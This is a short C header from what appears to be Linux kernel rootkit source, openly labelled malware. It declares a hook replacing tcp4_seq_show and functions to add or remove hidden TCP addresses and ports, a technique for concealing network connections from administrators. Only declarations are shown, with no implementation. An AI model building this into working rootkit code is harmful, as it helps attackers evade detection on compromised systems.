#ifndef TCP_SEQ_SHOW_H
#define TCP_SEQ_SHOW_H

#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/tcp.h>

asmlinkage long malw_tcp4_seq_show(struct seq_file *, void *);
void install_tcp_seq_show_hook(void);
void remove_tcp_seq_show_hook(void);

void add_hidden_tcp_ip(char *);
void remove_hidden_tcp_ip(char *);

void add_hidden_tcp_port(int);
void remove_hidden_tcp_port(int);

#endif
